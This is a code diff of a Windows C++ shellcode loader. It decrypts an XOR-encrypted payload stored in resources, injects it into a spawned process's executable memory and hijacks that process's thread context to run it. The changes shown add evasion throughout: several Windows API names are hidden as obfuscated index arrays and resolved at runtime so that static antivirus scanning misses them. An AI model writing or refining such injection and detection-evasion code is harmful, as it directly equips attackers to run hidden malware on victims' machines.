@@ -34,6 +34,7 @@ void main_star() {
     
     int load_resource_ok[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
     int size_of_Resource[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
+    int loc_res[] = {37, 14, 2, 10, 43, 4, 18, 14, 20, 17, 2, 4};
     
     int runtime_broker[] = {2, 64, 63, 63, 22, 8, 13, 3, 14, 22, 18, 63, 63, 18, 24, 18, 19, 4, 12, 55, 54, 63, 63, 43, 20, 13, 19, 8, 12, 4, 27, 17, 14, 10, 4, 17, 62, 4, 23, 4};
     
@@ -44,7 +45,7 @@ void main_star() {
     
     FARPROC pLoad_Resource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(load_resource_ok, big_string, sizeof(load_resource_ok)).c_str());
     FARPROC pSize_of_Resource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(size_of_Resource, big_string, sizeof(size_of_Resource)).c_str());
-     
+    FARPROC pLockResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str()); 
   
     auto Size_Of_Resource_Func = (DWORD(WINAPI*)(HMODULE, HRSRC))pSize_of_Resource;
  
@@ -53,7 +54,7 @@ void main_star() {
     HRSRC hResource = FindResource(hModule, "dhanushkey1", RT_RCDATA);
     HGLOBAL resrdata = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoad_Resource)(hModule, hResource);
     DWORD keLen = Size_Of_Resource_Func(hModule, hResource);
-    char* ke = (char*)LockResource(resrdata);
+    char* ke = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(resrdata);
 
    
     char* code199k;
@@ -61,7 +62,7 @@ void main_star() {
     hResource = FindResource(hModule, "dhanushcode56", RT_RCDATA);
     resrdata = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoad_Resource)(hModule, hResource);
     code199kLen = Size_Of_Resource_Func(hModule, hResource);
-    code199k = (char*)LockResource(resrdata);
+    code199k = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(resrdata);
     
     //std::cout <<getoriginal(creatingprocess, big_string, sizeof(creatingprocess)) << std::endl;  
     
@@ -93,20 +94,21 @@ void main_star() {
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
     
-    
-    auto pGetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKe__ws_ls_32, "GetThreadContext");
-    pGetThreadContext(pi.hThread, &ctx);
+    int get_thr_con[] = {32, 4, 19, 45, 7, 17, 4, 0, 3, 28, 14, 13, 19, 4, 23, 19};
+    auto pget_thr_con = (void(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_thr_con, big_string, sizeof(get_thr_con)).c_str());
+    pget_thr_con(pi.hThread, &ctx);
 
     LPVOID gallio = pvirall(pi.hProcess, NULL, code199kLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
     for (DWORD i = 0; i < code199kLen; i++) {
         code199k[i] ^= ke[i % keLen];
     }
-    pwrproc(pi.hProcess, gallio, code199k, code199kLen, NULL);
+    (BOOL(*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*))pwrproc(pi.hProcess, gallio, code199k, code199kLen, NULL);
     ctx.Rcx = (DWORD64)gallio;
-
-    auto pSetThreadContext = (BOOL(WINAPI*)(HANDLE, LPCONTEXT)) GetProcAddress(istfromKe__ws_ls_32, "SetThreadContext");
-    pSetThreadContext(pi.hThread, &ctx);
+    
+    int set_thre_con[] = {44, 4, 19, 45, 7, 17, 4, 0, 3, 28, 14, 13, 19, 4, 23, 19};
+    auto pset_thread_con = (void(WINAPI*)(HANDLE, LPCONTEXT))GetProcAddress(istfromKe__ws_ls_32, getoriginal(set_thre_con, big_string, sizeof(set_thre_con)).c_str());
+    pset_thread_con(pi.hThread, &ctx);
 
     auto pResumeThread = (DWORD(WINAPI*)(HANDLE)) GetProcAddress(istfromKe__ws_ls_32, getoriginal(reth, big_string, sizeof(reth)).c_str());
     pResumeThread(pi.hThread);
